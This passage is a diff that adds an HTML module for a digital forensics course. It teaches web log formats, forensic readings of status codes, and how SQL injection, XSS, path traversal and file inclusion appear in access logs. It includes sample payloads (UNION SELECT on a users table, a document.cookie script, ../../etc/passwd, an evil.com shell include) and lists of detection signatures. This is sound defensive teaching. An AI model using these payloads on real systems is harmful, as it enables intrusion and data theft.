@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 12.3 – Web Server Log Analysis and Web Attack Pattern Recognition</title>
+<style>
+:root{
+--primary:#1a5276;
+--primary-light:#2980b9;
+--primary-dark:#0e2f44;
+--accent:#e67e22;
+--accent-light:#f39c12;
+--success:#27ae60;
+--danger:#c0392b;
+--warning:#f39c12;
+--info:#2980b9;
+--bg:#f5f7fa;
+--surface:#ffffff;
+--text:#2c3e50;
+--text-light:#5d6d7e;
+--border:#d5dbdb;
+--code-bg:#1e1e1e;
+--code-text:#d4d4d4;
+--nav-height:54px;
+--radius:8px;
+--shadow:0 2px 8px rgba(0,0,0,.10);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;scroll-padding-top:calc(var(--nav-height) + 18px);}
+body{font-family:'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;font-size:1rem;line-height:1.65;color:var(--text);background:var(--bg);}
+
+/* ── sticky nav ── */
+.topnav{position:sticky;top:0;z-index:900;background:var(--primary);display:flex;flex-wrap:wrap;align-items:center;gap:4px 6px;padding:6px 16px;box-shadow:0 2px 6px rgba(0,0,0,.25);}
+.topnav a{color:#fff;text-decoration:none;font-size:.82rem;padding:5px 9px;border-radius:4px;white-space:nowrap;transition:background .2s;}
+.topnav a:hover,.topnav a:focus-visible{background:rgba(255,255,255,.2);outline:none;}
+.topnav a:focus-visible{outline:2px solid var(--accent);outline-offset:2px;}
+
+/* ── page wrapper ── */
+.page-wrap{max-width:960px;margin:0 auto;padding:24px 20px 60px;}
+
+/* ── headings ── */
+h1{font-size:1.75rem;color:var(--primary-dark);border-bottom:3px solid var(--accent);padding-bottom:8px;margin-bottom:6px;}
+.subtitle{font-size:1rem;color:var(--text-light);margin-bottom:24px;}
+h2{font-size:1.35rem;color:var(--primary);margin:36px 0 12px;padding-bottom:4px;border-bottom:2px solid var(--border);}
+h3{font-size:1.12rem;color:var(--primary-dark);margin:20px 0 8px;}
+h4{font-size:1rem;color:var(--text);margin:14px 0 6px;font-weight:600;}
+
+/* ── callout boxes ── */
+.callout{border-left:5px solid var(--info);background:#eaf2f8;border-radius:var(--radius);padding:16px 18px;margin:18px 0;position:relative;}
+.callout.bridge{border-left-color:var(--accent);background:#fef5e7;}
+.callout.tip{border-left-color:var(--success);background:#eafaf1;}
+.callout.warning{border-left-color:var(--danger);background:#fdedec;}
+.callout.forensic{border-left-color:#8e44ad;background:#f4ecf7;}
+.callout .callout-title{font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:6px;}
+.callout .callout-title .icon{font-size:1.15em;}
+
+/* ── code / log blocks ── */
+pre,code{font-family:'Cascadia Code','Fira Code',Consolas,'Courier New',monospace;}
+code{background:#eaecee;padding:1px 5px;border-radius:3px;font-size:.92em;color:var(--danger);}
+pre{background:var(--code-bg);color:var(--code-text);padding:16px;border-radius:var(--radius);overflow-x:auto;font-size:.85rem;line-height:1.6;margin:12px 0;white-space:pre-wrap;word-break:break-all;}
+pre .hl-ip{color:#4ec9b0;}
+pre .hl-date{color:#dcdcaa;}
+pre .hl-method{color:#569cd6;}
+pre .hl-uri{color:#ce9178;}
+pre .hl-status{color:#b5cea8;}
+pre .hl-size{color:#9cdcfe;}
+pre .hl-ref{color:#c586c0;}
+pre .hl-ua{color:#6a9955;}
+pre .hl-attack{color:#f44747;font-weight:700;}
+pre .hl-comment{color:#6a9955;font-style:italic;}
+
+/* ── tables ── */
+.table-wrap{overflow-x:auto;margin:14px 0;}
+table{width:100%;border-collapse:collapse;font-size:.9rem;}
+th,td{padding:9px 12px;text-align:left;border:1px solid var(--border);}
+th{background:var(--primary);color:#fff;font-weight:600;position:sticky;top:0;}
+tr:nth-child(even){background:#f8f9fa;}
+td code{font-size:.85em;}
+
+/* ── interactive log breakdown ── */
+.log-interactive{background:var(--code-bg);border-radius:var(--radius);padding:18px;margin:16px 0;color:var(--code-text);font-family:'Cascadia Code','Fira Code',Consolas,monospace;font-size:.84rem;line-height:2.1;position:relative;}
+.log-interactive .field{cursor:pointer;padding:2px 4px;border-radius:3px;transition:background .2s,outline .2s;position:relative;display:inline;}
+.log-interactive .field:hover,.log-interactive .field:focus-visible,.log-interactive .field[aria-expanded="true"]{outline:2px solid var(--accent);background:rgba(255,255,255,.12);}
+.field-tip{display:none;position:absolute;left:0;top:100%;background:#fff;color:var(--text);font-family:'Segoe UI',Roboto,sans-serif;font-size:.85rem;padding:10px 14px;border-radius:var(--radius);box-shadow:var(--shadow);z-index:50;min-width:240px;max-width:380px;line-height:1.5;border:1px solid var(--border);}
+.field-tip.show{display:block;}
+.field-tip strong{color:var(--primary);}
+
+/* ── collapsible / accordion ── */
+.accordion{margin:14px 0;}
+.acc-item{border:1px solid var(--border);border-radius:var(--radius);margin-bottom:8px;overflow:hidden;}
+.acc-btn{width:100%;background:var(--surface);border:none;text-align:left;padding:13px 16px;font-size:.97rem;font-weight:600;color:var(--primary-dark);cursor:pointer;display:flex;justify-content:space-between;align-items:center;transition:background .2s;}
+.acc-btn:hover,.acc-btn:focus-visible{background:#eaf2f8;}
+.acc-btn:focus-visible{outline:2px solid var(--accent);outline-offset:-2px;}
+.acc-btn .chevron{transition:transform .25s;font-size:.8em;}
+.acc-btn[aria-expanded="true"] .chevron{transform:rotate(180deg);}
+.acc-panel{max-height:0;overflow:hidden;transition:max-height .35s ease;background:var(--surface);}
+.acc-panel-inner{padding:4px 18px 18px;}
+
+/* ── tabs ── */
+.tabs{margin:16px 0;}
+.tab-list{display:flex;flex-wrap:wrap;gap:4px;border-bottom:2px solid var(--border);padding-bottom:0;}
+.tab-btn{background:none;border:none;padding:9px 16px;font-size:.9rem;font-weight:600;color:var(--text-light);cursor:pointer;border-bottom:3px solid transparent;margin-bottom:-2px;transition:color .2s,border-color .2s;}
+.tab-btn:hover{color:var(--primary);}
+.tab-btn:focus-visible{outline:2px solid var(--accent);outline-offset:-2px;}
+.tab-btn[aria-selected="true"]{color:var(--primary);border-bottom-color:var(--accent);}
+.tab-panel{display:none;padding:16px 2px;}
+.tab-panel.active{display:block;}
+
+/* ── reveal button ── */
+.reveal-btn{background:var(--primary);color:#fff;border:none;padding:10px 22px;border-radius:var(--radius);cursor:pointer;font-size:.92rem;font-weight:600;margin:12px 0;transition:background .2s;}
+.reveal-btn:hover,.reveal-btn:focus-visible{background:var(--primary-light);}
+.reveal-btn:focus-visible{outline:2px solid var(--accent);outline-offset:2px;}
+.reveal-content{display:none;border:2px solid var(--success);border-radius:var(--radius);padding:18px;margin:10px 0;background:#eafaf1;}
+.reveal-content.show{display:block;}
+
+/* ── knowledge check ── */
+.kc-question{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:18px;margin:14px 0;}
+.kc-question p.q-stem{font-weight:600;margin-bottom:10px;}
+.kc-options{list-style:none;padding:0;}
+.kc-options li{margin:6px 0;}
+.kc-options label{cursor:pointer;display:flex;align-items:flex-start;gap:8px;padding:6px 8px;border-radius:4px;transition:background .15s;}
+.kc-options label:hover{background:#f0f0f0;}
+.kc-options input[type="radio"]{margin-top:4px;accent-color:var(--primary);}
+.kc-feedback{display:none;margin-top:10px;padding:10px 14px;border-radius:var(--radius);font-size:.92rem;line-height:1.5;}
+.kc-feedback.correct{background:#eafaf1;border:1px solid var(--success);color:#1e7e34;}
+.kc-feedback.incorrect{background:#fdedec;border:1px solid var(--danger);color:var(--danger);}
+.kc-submit{background:var(--primary);color:#fff;border:none;padding:8px 18px;border-radius:var(--radius);cursor:pointer;font-size:.88rem;font-weight:600;margin-top:8px;transition:background .2s;}
+.kc-submit:hover,.kc-submit:focus-visible{background:var(--primary-light);}
+.kc-submit:focus-visible{outline:2px solid var(--accent);outline-offset:2px;}
+
+/* ── timeline table ── */
+.timeline-table td:first-child{white-space:nowrap;font-weight:600;width:60px;}
+
+/* ── misc ── */
+ul,ol{margin:8px 0 8px 22px;}
+li{margin:4px 0;}
+p{margin:8px 0;}
+strong{color:var(--primary-dark);}
+.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);border:0;}
+@media(max-width:600px){
+  .topnav{padding:5px 8px;}
+  .topnav a{font-size:.74rem;padding:4px 6px;}
+  h1{font-size:1.35rem;}
+  .page-wrap{padding:16px 10px 40px;}
+  pre{font-size:.78rem;padding:10px;}
+  .log-interactive{font-size:.75rem;}
+}
+</style>
+</head>
+<body>
+
+<!-- ════════════════════════ NAVIGATION ════════════════════════ -->
+<nav class="topnav" role="navigation" aria-label="Module sections">
+  <a href="#bridge">Week 9 Bridge</a>
+  <a href="#log-formats">Log Formats</a>
+  <a href="#status-codes">Status Codes</a>
+  <a href="#attack-indicators">Attack Indicators</a>
+  <a href="#correlation">Correlation</a>
+  <a href="#mini-case">Mini-Case</a>
+  <a href="#knowledge-check">Knowledge Check</a>
+</nav>
+
+<div class="page-wrap">
+
+<!-- ════════════════════════ HEADER ════════════════════════ -->
+<header>
+  <h1>Module 12.3 – Web Server Log Analysis &amp; Web Attack Pattern Recognition</h1>
+  <p class="subtitle">CSC 156 – Digital Forensics Fundamentals &nbsp;|&nbsp; Week 12</p>
+</header>
+
+<!-- ════════════════════════ §1 BRIDGE ════════════════════════ -->
+<section id="bridge" aria-labelledby="bridge-heading">
+<div class="callout bridge">
+  <p class="callout-title"><span class="icon" aria-hidden="true">🔗</span> Connecting to Prior Learning — Module 9.4</p>
+  <p>In <strong>Module 9.4 – Log Analysis Fundamentals</strong>, you were introduced to the <em>Apache Combined Log Format</em> and practiced reading individual fields. That module built your foundational "log literacy."</p>
+  <p>This module <strong>significantly expands</strong> that foundation. We move from reading individual log lines to <strong>recognizing attack patterns</strong> across multiple entries, correlating evidence, and constructing forensic timelines. You will encounter three log formats, a full HTTP status-code forensic reference, five categories of web attacks, and a realistic mini-case exercise.</p>
+  <p>If the Apache Combined Log Format fields feel fuzzy, revisit your notes from Module 9.4 before proceeding.</p>
+</div>
+</section>
+
+<!-- ════════════════════════ §2 LOG FORMATS ════════════════════════ -->
+<section id="log-formats" aria-labelledby="logformats-heading">
+<h2 id="logformats-heading">1. Log Formats — Field by Field</h2>
+<p>Different web servers record requests in different formats, but the core data elements are remarkably similar. A forensic examiner must be comfortable with all three major formats and know where each server stores its logs.</p>
+
+<!-- ── 1a Apache Combined ── -->
+<h3>1.1 Apache Combined Log Format (CLF)</h3>
+<p>The Apache Combined Log Format is the most common format encountered in forensic casework. It extends the Common Log Format by appending the <strong>Referer</strong> and <strong>User-Agent</strong> fields.</p>
+
+<div class="callout tip">
+  <p class="callout-title"><span class="icon" aria-hidden="true">💡</span> Access Logs vs. Error Logs</p>
+  <p><strong>Access logs</strong> (<code>access.log</code>) record every HTTP request, whether successful or not. <strong>Error logs</strong> (<code>error.log</code>) record server-side issues, misconfigurations, and application errors. Forensic examiners should always collect <em>both</em>—error logs frequently contain stack traces and path disclosures that illuminate what happened behind the scenes during an attack.</p>
+</div>
+
+<p>Click or tap any highlighted field below to see its definition and forensic significance:</p>
+
+<!-- Interactive log line -->
+<div class="log-interactive" role="group" aria-label="Interactive Apache log line — click each field for details">
+<span class="field" tabindex="0" role="button" aria-expanded="false" data-tip="field-ip">192.168.44.27</span>&nbsp;
+<span class="field" tabindex="0" role="button" aria-expanded="false" data-tip="field-ident">-</span>&nbsp;
+<span class="field" tabindex="0" role="button" aria-expanded="false" data-tip="field-user">jdoe</span>&nbsp;
+<span class="field" tabindex="0" role="button" aria-expanded="false" data-tip="field-time">[15/Apr/2026:09:32:17 -0700]</span>&nbsp;
+<span class="field" tabindex="0" role="button" aria-expanded="false" data-tip="field-request">"GET /app/dashboard?id=42 HTTP/1.1"</span>&nbsp;
+<span class="field" tabindex="0" role="button" aria-expanded="false" data-tip="field-status">200</span>&nbsp;
+<span class="field" tabindex="0" role="button" aria-expanded="false" data-tip="field-size">3842</span>&nbsp;
+<span class="field" tabindex="0" role="button" aria-expanded="false" data-tip="field-ref">"https://intranet.example.com/login"</span>&nbsp;
+<span class="field" tabindex="0" role="button" aria-expanded="false" data-tip="field-ua">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"</span>
+
+<!-- Tooltips -->
+<div class="field-tip" id="field-ip"><strong>Client IP Address (Remote Host)</strong><br>The IP address of the client that made the request. In forensic analysis this is the primary identifier for attributing requests to a source. Note: this may be a proxy or NAT address—always cross-reference with firewall and DHCP logs.</div>
+<div class="field-tip" id="field-ident"><strong>Ident (RFC 1413)</strong><br>Identity of the client from the <code>identd</code> daemon. Almost always a hyphen (<code>-</code>) because the protocol is rarely enabled. Forensically insignificant in modern environments.</div>
+<div class="field-tip" id="field-user"><strong>Authenticated User</strong><br>The username if HTTP authentication was used; otherwise a hyphen. Critically important: if this field is populated during an attack, it may indicate compromised credentials or a successful brute-force login.</div>
+<div class="field-tip" id="field-time"><strong>Timestamp</strong><br>Date, time, and UTC offset of the request. The examiner must verify the server's timezone configuration and whether NTP synchronization was active. Timestamps are the backbone of forensic timelines.</div>
+<div class="field-tip" id="field-request"><strong>Request Line</strong><br>Contains the HTTP method (<code>GET</code>, <code>POST</code>, etc.), the URI path with query string, and the HTTP version. This is the <em>primary field for attack detection</em>—SQL injection payloads, directory traversal sequences, and XSS vectors appear here.</div>
+<div class="field-tip" id="field-status"><strong>HTTP Status Code</strong><br>The server's response code (e.g., 200 = OK, 404 = Not Found, 500 = Internal Server Error). Patterns of status codes reveal attack phases: bursts of 404s indicate scanning, 401/403 sequences indicate brute-forcing, and a sudden 200 after many failures may indicate a breach.</div>
+<div class="field-tip" id="field-size"><strong>Response Size (Bytes)</strong><br>The number of bytes in the response body (excluding headers). Anomalous sizes can indicate data exfiltration (unusually large responses) or error conditions (unusually small responses where content was expected).</div>
+<div class="field-tip" id="field-ref"><strong>Referer Header</strong><br>The URL the client claims to have come from. Useful for tracing navigation paths. Attackers sometimes forge this field, and it can contain attack payloads in Referer-based injection attacks. Note the historical misspelling ("Referer" not "Referrer").</div>
+<div class="field-tip" id="field-ua"><strong>User-Agent String</strong><br>Identifies the client software. Forensically valuable for identifying automated tools (e.g., <code>Nikto</code>, <code>sqlmap</code>, <code>DirBuster</code>). Legitimate browsers produce long, complex UA strings; scanners often have distinctive short signatures.</div>
+</div>
+
+<p>The Apache Combined Log Format string in the server configuration is:</p>
+<pre><span class="hl-comment"># LogFormat directive in httpd.conf / apache2.conf</span>
+LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined</pre>
+
+<!-- ── 1b Nginx ── -->
+<h3>1.2 Nginx Combined Log Format</h3>
+<p>By default, Nginx uses a format nearly identical to Apache's Combined format. The field order and content are the same; only the configuration syntax differs:</p>
+<pre><span class="hl-comment"># nginx.conf log_format directive</span>
+log_format combined '$remote_addr - $remote_user [$time_local] '
+                    '"$request" $status $body_bytes_sent '
+                    '"$http_referer" "$http_user_agent"';</pre>
+<p>Forensically, you can apply the same field-by-field analysis to Nginx logs. Key differences to note:</p>
+<ul>
+  <li>Default access log path: <code>/var/log/nginx/access.log</code></li>
+  <li>Default error log path: <code>/var/log/nginx/error.log</code></li>
+  <li>Nginx error logs include a <strong>severity level</strong> (e.g., <code>[error]</code>, <code>[crit]</code>) that is useful for filtering forensically significant events.</li>
+  <li>Some Nginx configurations add <code>$request_time</code> or <code>$upstream_response_time</code>, which can reveal performance impacts from attack payloads.</li>
+</ul>
+
+<!-- ── 1c IIS W3C ── -->
+<h3>1.3 IIS W3C Extended Log Format</h3>
+<p>Microsoft Internet Information Services (IIS) uses the <strong>W3C Extended Log Format</strong>, which is space-delimited with a header block that defines the field order. This header makes the format self-documenting but also means the field order can vary between servers.</p>
+<pre><span class="hl-comment">#Software: Microsoft Internet Information Services 10.0</span>
+<span class="hl-comment">#Version: 1.0</span>
+<span class="hl-comment">#Date: 2026-04-15 09:00:00</span>
+<span class="hl-comment">#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-bytes time-taken</span>
+2026-04-15 09:32:17 10.0.0.5 GET /app/dashboard id=42 443 jdoe 192.168.44.27 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) https://intranet.example.com/login 200 0 3842 125</pre>
+
+<p>Key forensic differences from Apache/Nginx formats:</p>
+<ul>
+  <li><strong>URI stem and query are separate fields</strong> (<code>cs-uri-stem</code> and <code>cs-uri-query</code>), making it easier to filter on query parameters but requiring you to mentally combine them.</li>
+  <li><strong><code>sc-substatus</code></strong> provides Windows-specific error subcodes (e.g., <code>401.3</code> = ACL denied) that add forensic detail.</li>
+  <li><strong><code>time-taken</code></strong> is recorded in milliseconds, useful for identifying slow queries caused by injection payloads.</li>
+  <li>Default log path: <code>C:\inetpub\logs\LogFiles\W3SVC&lt;SiteID&gt;\</code></li>
+  <li>Spaces in values are encoded as <code>+</code> signs.</li>
+  <li>Always read the <code>#Fields:</code> header line first to determine column order.</li>
+</ul>
+
+<div class="callout forensic">
+  <p class="callout-title"><span class="icon" aria-hidden="true">🔍</span> Forensic Note — Log Format Identification</p>
+  <p>When you receive log files during an investigation, the <strong>first step</strong> is always to identify the format. Look for: (1) the <code>#Fields:</code> header (IIS W3C), (2) the bracket-enclosed timestamp with timezone offset (Apache/Nginx), or (3) configuration files that define custom formats. Never assume—custom formats are common, and misreading fields will corrupt your analysis.</p>
+</div>
+</section>
+
+<!-- ════════════════════════ §3 STATUS CODES ════════════════════════ -->
+<section id="status-codes" aria-labelledby="status-heading">
+<h2 id="status-heading">2. HTTP Status Codes for Forensic Analysis</h2>
+<p>HTTP status codes are three-digit numbers returned by the server in response to each request. They fall into five classes. The table below focuses on codes with the highest <strong>forensic significance</strong>—the ones that most commonly appear during attacks or reveal attacker behavior.</p>
+
+<div class="table-wrap">
+<table>
+  <caption class="sr-only">HTTP Status Code Forensic Reference Card</caption>
+  <thead>
+    <tr><th>Code</th><th>Name</th><th>Class</th><th>Forensic Significance</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><code>200</code></td><td>OK</td><td>2xx Success</td><td>Request succeeded. After a series of failed attack attempts, a 200 may indicate the attacker found a valid path or payload. Check the response size for anomalies.</td></tr>
+    <tr><td><code>301</code></td><td>Moved Permanently</td><td>3xx Redirect</td><td>Permanent redirect. Can indicate URL rewriting that may obscure the actual resource accessed. Check the redirect target.</td></tr>
+    <tr><td><code>302</code></td><td>Found (Redirect)</td><td>3xx Redirect</td><td>Temporary redirect. Often seen after successful login (redirect to dashboard). A 302 following brute-force attempts may indicate credential compromise.</td></tr>
+    <tr><td><code>400</code></td><td>Bad Request</td><td>4xx Client Error</td><td>Malformed request. Common when attack payloads break HTTP syntax. Clusters of 400s from one IP suggest automated attack tools.</td></tr>
+    <tr><td><code>401</code></td><td>Unauthorized</td><td>4xx Client Error</td><td>Authentication required/failed. Rapid sequences of 401s indicate <strong>brute-force or credential-stuffing attacks</strong>.</td></tr>
+    <tr><td><code>403</code></td><td>Forbidden</td><td>4xx Client Error</td><td>Access denied by server policy. May indicate the attacker is probing restricted directories or the WAF is blocking payloads.</td></tr>
+    <tr><td><code>404</code></td><td>Not Found</td><td>4xx Client Error</td><td>Resource does not exist. High volumes of 404s from a single IP are a hallmark of <strong>directory/file enumeration and scanning</strong>.</td></tr>
+    <tr><td><code>405</code></td><td>Method Not Allowed</td><td>4xx Client Error</td><td>HTTP method not permitted. May appear when attackers try PUT, DELETE, or TRACE methods during reconnaissance.</td></tr>
+    <tr><td><code>408</code></td><td>Request Timeout</td><td>4xx Client Error</td><td>Client took too long. Can indicate <strong>Slowloris</strong> or similar slow-rate denial-of-service attacks.</td></tr>
+    <tr><td><code>414</code></td><td>URI Too Long</td><td>4xx Client Error</td><td>The request URI exceeded the server's limit. Often triggered by excessively long injection payloads in the URL.</td></tr>
+    <tr><td><code>500</code></td><td>Internal Server Error</td><td>5xx Server Error</td><td><strong>High forensic value.</strong> Often caused by injection payloads that crash the application. A 500 following a request with SQL syntax in the URI is a strong indicator of SQL injection testing.</td></tr>
+    <tr><td><code>502</code></td><td>Bad Gateway</td><td>5xx Server Error</td><td>Upstream server failure. May indicate that an attack payload crashed a backend application server.</td></tr>
+    <tr><td><code>503</code></td><td>Service Unavailable</td><td>5xx Server Error</td><td>Server overloaded or in maintenance. Can result from successful denial-of-service attacks.</td></tr>
+  </tbody>
+</table>
+</div>
+
+<div class="callout tip">
+  <p class="callout-title"><span class="icon" aria-hidden="true">💡</span> Pattern, Not Individual Codes</p>
+  <p>A single 404 or 500 is routine. The forensic signal is in the <strong>pattern</strong>: dozens of 404s in rapid succession from one IP = scanning; a sequence of 500s with SQL keywords in the URI = injection testing; a burst of 401s followed by a 302 redirect = possible brute-force success. Always analyze status codes in context and over time.</p>
+</div>
+</section>
+
+<!-- ════════════════════════ §4 ATTACK INDICATORS ════════════════════════ -->
+<section id="attack-indicators" aria-labelledby="attack-heading">
+<h2 id="attack-heading">3. Web Attack Indicators in Log Files</h2>
+<p>This section covers five major categories of web attacks as they appear in server logs. Each category includes a pattern description, key signatures to search for, and an annotated example log line. Expand each section to study the details.</p>
+
+<div class="accordion" id="attack-accordion">
+
+<!-- ── 3a SQL Injection ── -->
+<div class="acc-item">
+  <button class="acc-btn" aria-expanded="false" aria-controls="panel-sqli" id="btn-sqli">
+    <span>3.1 SQL Injection (SQLi)</span>
+    <span class="chevron" aria-hidden="true">▼</span>
+  </button>
+  <div class="acc-panel" id="panel-sqli" role="region" aria-labelledby="btn-sqli">
+    <div class="acc-panel-inner">
+      <h4>What It Is</h4>
+      <p>SQL Injection occurs when an attacker inserts SQL syntax into user-supplied input fields (query parameters, form fields, cookies, or headers) that are passed unsanitized to a database query. The goal may be data extraction, authentication bypass, data modification, or even command execution.</p>
+
+      <h4>Log Signatures to Search For</h4>
+      <ul>
+        <li><code>UNION+SELECT</code> or <code>UNION%20SELECT</code> — union-based injection to extract data from other tables</li>
+        <li><code>OR+1=1</code>, <code>OR+'1'='1</code>, <code>' OR ''='</code> — boolean-based authentication bypass</li>
+        <li><code>SELECT</code>, <code>INSERT</code>, <code>UPDATE</code>, <code>DELETE</code>, <code>DROP</code> — SQL keywords in URI or query string</li>
+        <li><code>SLEEP(</code>, <code>BENCHMARK(</code>, <code>WAITFOR+DELAY</code> — time-based blind injection</li>
+        <li><code>--</code> or <code>%23</code> (URL-encoded <code>#</code>) — SQL comment sequences used to truncate queries</li>
+        <li><code>CHAR(</code>, <code>CONCAT(</code>, <code>0x</code> — encoding/obfuscation of payloads</li>
+        <li>Requests that produce <strong>500 Internal Server Error</strong> responses alongside these keywords</li>
+      </ul>
+
+      <h4>Annotated Example Log Line</h4>
+<pre><span class="hl-ip">10.0.0.99</span> - - <span class="hl-date">[15/Apr/2026:10:14:33 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/products/detail?id=<span class="hl-attack">7'+UNION+SELECT+username,password+FROM+users--</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">500</span> <span class="hl-size">842</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"<span class="hl-attack">sqlmap/1.7.5#stable</span>"</span></pre>
+      <p><strong>Analysis:</strong></p>
+      <ul>
+        <li>The <code>id</code> parameter contains a <code>UNION SELECT</code> payload targeting a <code>users</code> table.</li>
+        <li>The single quote (<code>'</code>) before <code>UNION</code> closes the original query's string literal.</li>
+        <li>The double-dash (<code>--</code>) comments out the remainder of the original SQL query.</li>
+        <li>The <strong>500 status code</strong> indicates the payload caused a server error—the application likely threw a database exception.</li>
+        <li>The <strong>User-Agent</strong> identifies <code>sqlmap</code>, a well-known automated SQL injection tool.</li>
+        <li>Response size of 842 bytes is small, suggesting an error page rather than successful data extraction.</li>
+      </ul>
+
+      <div class="callout warning">
+        <p class="callout-title"><span class="icon" aria-hidden="true">⚠️</span> URL Encoding</p>
+        <p>Attackers frequently URL-encode payloads to evade simple pattern matching. For example, <code>UNION SELECT</code> may appear as <code>%55NION%20%53ELECT</code> or use double encoding (<code>%2555NION</code>). Always decode log entries before analysis. Many log analysis tools have built-in URL decode functions.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ── 3b XSS ── -->
+<div class="acc-item">
+  <button class="acc-btn" aria-expanded="false" aria-controls="panel-xss" id="btn-xss">
+    <span>3.2 Cross-Site Scripting (XSS)</span>
+    <span class="chevron" aria-hidden="true">▼</span>
+  </button>
+  <div class="acc-panel" id="panel-xss" role="region" aria-labelledby="btn-xss">
+    <div class="acc-panel-inner">
+      <h4>What It Is</h4>
+      <p>Cross-Site Scripting (XSS) occurs when an attacker injects client-side scripts (usually JavaScript) into web pages viewed by other users. While XSS executes in the <em>victim's browser</em> (not on the server), the attack payloads are visible in server logs when delivered via URL parameters (Reflected XSS) or when the attacker tests payloads.</p>
+
+      <h4>Log Signatures to Search For</h4>
+      <ul>
+        <li><code>&lt;script&gt;</code> or URL-encoded equivalents (<code>%3Cscript%3E</code>)</li>
+        <li><code>javascript:</code> protocol in parameter values</li>
+        <li><code>onerror=</code>, <code>onload=</code>, <code>onmouseover=</code> — HTML event handler injection</li>
+        <li><code>alert(</code>, <code>prompt(</code>, <code>confirm(</code> — common proof-of-concept functions</li>
+        <li><code>document.cookie</code>, <code>document.location</code> — cookie theft and redirection payloads</li>
+        <li><code>&lt;img+src=x+onerror=</code> — image tag injection, a common WAF bypass technique</li>
+      </ul>
+
+      <h4>Annotated Example Log Line</h4>
+<pre><span class="hl-ip">10.0.0.99</span> - - <span class="hl-date">[15/Apr/2026:10:16:05 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/search?q=<span class="hl-attack">%3Cscript%3Ealert(document.cookie)%3C/script%3E</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">4521</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"</span></pre>
+      <p><strong>Analysis:</strong></p>
+      <ul>
+        <li>The <code>q</code> parameter contains a URL-encoded <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> payload.</li>
+        <li>The <strong>200 status code</strong> means the server accepted and processed the request—if the application reflects this input without sanitization, the script will execute in the browser of anyone who views the page.</li>
+        <li>The response size (4521 bytes) is normal for a search results page, suggesting the payload was embedded in the response.</li>
+        <li>The User-Agent appears legitimate, which is common—XSS testing is often done manually through a regular browser.</li>
+      </ul>
+
+      <div class="callout forensic">
+        <p class="callout-title"><span class="icon" aria-hidden="true">🔍</span> Forensic Note — POST-Based XSS</p>
+        <p>Many XSS payloads are delivered via POST request bodies, which are <strong>not recorded</strong> in standard access logs. If you suspect XSS but see no payloads in access logs, check application-level logs, WAF logs, or packet captures. This is a significant limitation of access-log-only analysis.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ── 3c Directory Traversal / File Inclusion ── -->
+<div class="acc-item">
+  <button class="acc-btn" aria-expanded="false" aria-controls="panel-traversal" id="btn-traversal">
+    <span>3.3 Directory Traversal &amp; File Inclusion (LFI / RFI / Null Byte)</span>
+    <span class="chevron" aria-hidden="true">▼</span>
+  </button>
+  <div class="acc-panel" id="panel-traversal" role="region" aria-labelledby="btn-traversal">
+    <div class="acc-panel-inner">
+      <h4>What It Is</h4>
+      <p>This family of attacks manipulates file path references in web application parameters to access files outside the intended directory. There are several related techniques:</p>
+      <ul>
+        <li><strong>Path Traversal (<code>../</code>)</strong> — Using dot-dot-slash sequences to navigate up the directory tree and access sensitive system files.</li>
+        <li><strong>Local File Inclusion (LFI)</strong> — Exploiting a file-include mechanism (e.g., <code>page=about.php</code>) to include arbitrary local files, such as <code>/etc/passwd</code> or application configuration files.</li>
+        <li><strong>Remote File Inclusion (RFI)</strong> — Exploiting the same mechanism to include a file from an attacker-controlled remote server (e.g., <code>page=http://evil.com/shell.txt</code>), often to execute a web shell.</li>
+        <li><strong>Null Byte Injection (<code>%00</code>)</strong> — Appending a null byte to truncate a file extension that the application appends automatically. For example, if the application does <code>include($input . ".php")</code>, the attacker submits <code>../../../../etc/passwd%00</code> so the <code>.php</code> extension is ignored by the underlying C-based file functions.</li>
+      </ul>
+
+      <h4>Log Signatures to Search For</h4>
+      <ul>
+        <li><code>../</code> or <code>..%2f</code> or <code>%2e%2e/</code> or <code>..%5c</code> (backslash variant for Windows) — path traversal sequences</li>
+        <li><code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>win.ini</code>, <code>boot.ini</code> — common target files</li>
+        <li><code>/proc/self/environ</code> — Linux process environment, used for LFI-to-RCE escalation</li>
+        <li><code>php://filter</code>, <code>php://input</code> — PHP stream wrappers used in advanced LFI</li>
+        <li><code>http://</code> or <code>https://</code> in parameter values — Remote File Inclusion indicator</li>
+        <li><code>%00</code> or <code>\x00</code> — null byte injection</li>
+        <li>Parameters named <code>page</code>, <code>file</code>, <code>include</code>, <code>path</code>, <code>template</code>, <code>doc</code> — commonly targeted by inclusion attacks</li>
+      </ul>
+
+      <h4>Annotated Example: Path Traversal</h4>
+<pre><span class="hl-ip">10.0.0.99</span> - - <span class="hl-date">[15/Apr/2026:10:18:42 -0700]</span> <span class="hl-method">"GET</span> <span class="hl-uri">/app/download?file=<span class="hl-attack">../../../../etc/passwd</span></span> <span class="hl-method">HTTP/1.1"</span> <span class="hl-status">200</span> <span class="hl-size">1847</span> <span class="hl-ref">"-"</span> <span class="hl-ua">"Mozilla/5.0"</span></pre>
